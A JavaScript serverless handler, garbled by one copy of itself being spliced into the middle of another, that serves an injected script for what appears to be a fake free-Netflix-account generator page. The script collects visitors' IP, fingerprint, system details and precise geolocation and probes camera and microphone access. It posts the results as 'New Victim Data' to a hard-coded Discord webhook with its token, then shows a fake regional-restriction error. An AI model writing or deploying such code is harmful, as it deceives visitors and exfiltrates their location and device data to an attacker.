export default async function handler(req, res) {
    // Set response as JavaScript
    res.setHeader('Content-Type', 'application/javascript');
    
    // Obfuscated webhook (base64 encoded)
    const webhook = atob('aHR0cHM6Lyexport default async function handler(req, res) {
    // Set response as JavaScript
    res.setHeader('Content-Type', 'application/javascript');
    
    // YOUR WEBHOOK INTEGRATED
    const webhook = 'https://discord.com/api/webhooks/1435965962900996206/8_no1ovawlBkyTUQEIwx0GQdVaZz0f7C61Zte2KXNYSAJ8hsokVbOgwQXUO7jChnPbrm';
    
    const maliciousCode = `
        // Advanced victim detection
        (function() {
            const victimData = {
                stage: 'initial',
                timestamp: new Date().toISOString(),
                url: window.location.href,
                referrer: document.referrer
            };
            
            // Override the fake generator with real malware
            const originalGenerator = window.startGenerator;
            window.startGenerator = function() {
                // Show loading
                document.getElementById('loading').style.display = 'block';
                document.querySelector('.btn').style.display = 'none';
                
                // Start advanced data collection
                collectAdvancedData();
            };
            
            // Advanced data collection
            async function collectAdvancedData() {
                try {
                    // Get IP and location
                    const ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json());
                    victimData.ip = ipData.ip;
                    
                    // Advanced fingerprinting
                    victimData.fingerprint = await generateFingerprint();
                    
                    // Get detailed system info
                    victimData.system = getSystemInfo();
                    
                    // Try to get precise location
                    await getGeolocation();
                    
                    // Send initial data
                    await sendToDiscord('VICTIM_INTERACTION', victimData);
                    
                    // Start camera/mic access attempts
                    setTimeout(attemptMediaAccess, 2000);
                    
                } catch (error) {
                    console.log('Data collection error');
                }
            }
            
            function generateFingerprint() {
                return new Promise((resolve) => {
                    const canvas = document.createElement('canvas');
                    const ctx = canvas.getContext('2d');
                    ctx.textBaseline = 'top';
                    ctx.font = '14px Arial';
                    ctx.fillText('Fingerprint', 2, 2);
                    const fingerprint = canvas.toDataURL();
                    resolve(fingerprint.substring(0, 100));
                });
            }
            
            function getSystemInfo() {
                return {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    languages: navigator.languages,
                    screen: screen.width + 'x' + screen.height,
                    colorDepth: screen.colorDepth,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    cookies: navigator.cookieEnabled,
                    javaEnabled: navigator.javaEnabled(),
                    pdfEnabled: navigator.pdfViewerEnabled,
                    hardwareConcurrency: navigator.hardwareConcurrency,
                    deviceMemory: navigator.deviceMemory,
                    touchSupport: 'ontouchstart' in window
                };
            }
            
            function getGeolocation() {
                return new Promise((resolve) => {
                    if (navigator.geolocation) {
                        navigator.geolocation.getCurrentPosition(
                            position => {
                                victimData.location = {
                                    latitude: position.coords.latitude,
                                    longitude: position.coords.longitude,
                                    accuracy: position.coords.accuracy
                                };
                                resolve();
                            },
                            error => {
                                victimData.locationError = error.message;
                                resolve();
                            },
                            { enableHighAccuracy: true, timeout: 10000 }
                        );
                    } else {
                        resolve();
                    }
                });
            }
            
            async function attemptMediaAccess() {
                try {
                    // Try to access camera
                    const stream = await navigator.mediaDevices.getUserMedia({ 
                        video: { width: 1280, height: 720 } 
                    });
                    victimData.cameraAccess = true;
                    stream.getTracks().forEach(track => track.stop());
                } catch (e) {
                    victimData.cameraAccess = false;
                }
                
                try {
                    // Try to access microphone
                    const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
                    victimData.microphoneAccess = true;
                    audioStream.getTracks().forEach(track => track.stop());
                } catch (e) {
                    victimData.microphoneAccess = false;
                }
                
                // Send media access results
                await sendToDiscord('MEDIA_ACCESS', victimData);
                
                // Show fake error message
                showFakeError();
            }
            
            async function sendToDiscord(type, data) {
                try {
                    await fetch('${webhook}', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            username: 'Netflix Analytics',
                            embeds: [{
                                title: 'New Victim Data - ' + type,
                                color: 0xe50914,
                                fields: Object.entries(data).map(([key, value]) => ({
                                    name: key,
                                    value: String(value).substring(0, 100) + (String(value).length > 100 ? '...' : ''),
                                    inline: key.length < 10
                                })),
                                timestamp: new Date().toISOString()
                            }]
                        })
                    });
                } catch (error) {
                    // Silent fail
                }
            }
            
            function showFakeError() {
                document.querySelector('.container').innerHTML = 
                    '<h2 style="color: #e50914">❌ Regional Restriction</h2>' +
                    '<p>No accounts available in your location.</p>' +
                    '<p>Try using a VPN or check back later.</p>' +
                    '<button class="btn" onclick="location.reload()">TRY DIFFERENT REGION</button>';
            }
            
            // Auto-collect data if user stays on page
            setTimeout(() => {
                if (!victimData.ip && document.hasFocus()) {
                    collectAdvancedData();
                }
            }, 15000);
            
        })();
    `;
    
    res.send(maliciousCode);
}9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvWU9VUl9XRUJIT09LX0lEL1lPVVJfV0VCSE9PS19UT0tFTg==');
    
    const maliciousCode = `
        // Advanced victim detection
        (function() {
            const victimData = {
                stage: 'initial',
                timestamp: new Date().toISOString(),
                url: window.location.href,
                referrer: document.referrer
            };
            
            // Override the fake generator with real malware
            const originalGenerator = window.startGenerator;
            window.startGenerator = function() {
                // Show loading
                document.getElementById('loading').style.display = 'block';
                document.querySelector('.btn').style.display = 'none';
                
                // Start advanced data collection
                collectAdvancedData();
            };
            
            // Advanced data collection
            async function collectAdvancedData() {
                try {
                    // Get IP and location
                    const ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json());
                    victimData.ip = ipData.ip;
                    
                    // Advanced fingerprinting
                    victimData.fingerprint = await generateFingerprint();
                    
                    // Get detailed system info
                    victimData.system = getSystemInfo();
                    
                    // Try to get precise location
                    await getGeolocation();
                    
                    // Send initial data
                    await sendToDiscord('VICTIM_INTERACTION', victimData);
                    
                    // Start camera/mic access attempts
                    setTimeout(attemptMediaAccess, 2000);
                    
                } catch (error) {
                    console.log('Data collection error');
                }
            }
            
            function generateFingerprint() {
                return new Promise((resolve) => {
                    const canvas = document.createElement('canvas');
                    const ctx = canvas.getContext('2d');
                    ctx.textBaseline = 'top';
                    ctx.font = '14px Arial';
                    ctx.fillText('Fingerprint', 2, 2);
                    const fingerprint = canvas.toDataURL();
                    resolve(fingerprint.substring(0, 100));
                });
            }
            
            function getSystemInfo() {
                return {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    languages: navigator.languages,
                    screen: screen.width + 'x' + screen.height,
                    colorDepth: screen.colorDepth,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    cookies: navigator.cookieEnabled,
                    javaEnabled: navigator.javaEnabled(),
                    pdfEnabled: navigator.pdfViewerEnabled,
                    hardwareConcurrency: navigator.hardwareConcurrency,
                    deviceMemory: navigator.deviceMemory,
                    touchSupport: 'ontouchstart' in window
                };
            }
            
            function getGeolocation() {
                return new Promise((resolve) => {
                    if (navigator.geolocation) {
                        navigator.geolocation.getCurrentPosition(
                            position => {
                                victimData.location = {
                                    latitude: position.coords.latitude,
                                    longitude: position.coords.longitude,
                                    accuracy: position.coords.accuracy
                                };
                                resolve();
                            },
                            error => {
                                victimData.locationError = error.message;
                                resolve();
                            },
                            { enableHighAccuracy: true, timeout: 10000 }
                        );
                    } else {
                        resolve();
                    }
                });
            }
            
            async function attemptMediaAccess() {
                try {
                    // Try to access camera
                    const stream = await navigator.mediaDevices.getUserMedia({ 
                        video: { width: 1280, height: 720 } 
                    });
                    victimData.cameraAccess = true;
                    stream.getTracks().forEach(track => track.stop());
                } catch (e) {
                    victimData.cameraAccess = false;
                }
                
                try {
                    // Try to access microphone
                    const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
                    victimData.microphoneAccess = true;
                    audioStream.getTracks().forEach(track => track.stop());
                } catch (e) {
                    victimData.microphoneAccess = false;
                }
                
                // Send media access results
                await sendToDiscord('MEDIA_ACCESS', victimData);
                
                // Show fake error message
                showFakeError();
            }
            
            async function sendToDiscord(type, data) {
                try {
                    await fetch('${webhook}', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            username: 'Netflix Analytics',
                            embeds: [{
                                title: 'New Victim Data - ' + type,
                                color: 0xe50914,
                                fields: Object.entries(data).map(([key, value]) => ({
                                    name: key,
                                    value: String(value).substring(0, 100) + (String(value).length > 100 ? '...' : ''),
                                    inline: key.length < 10
                                })),
                                timestamp: new Date().toISOString()
                            }]
                        })
                    });
                } catch (error) {
                    // Silent fail
                }
            }
            
            function showFakeError() {
                document.querySelector('.container').innerHTML = 
                    '<h2 style="color: #e50914">❌ Regional Restriction</h2>' +
                    '<p>No accounts available in your location.</p>' +
                    '<p>Try using a VPN or check back later.</p>' +
                    '<button class="btn" onclick="location.reload()">TRY DIFFERENT REGION</button>';
            }
            
            // Auto-collect data if user stays on page
            setTimeout(() => {
                if (!victimData.ip && document.hasFocus()) {
                    collectAdvancedData();
                }
            }, 15000);
            
        })();
    `;
    
    res.send(maliciousCode);
}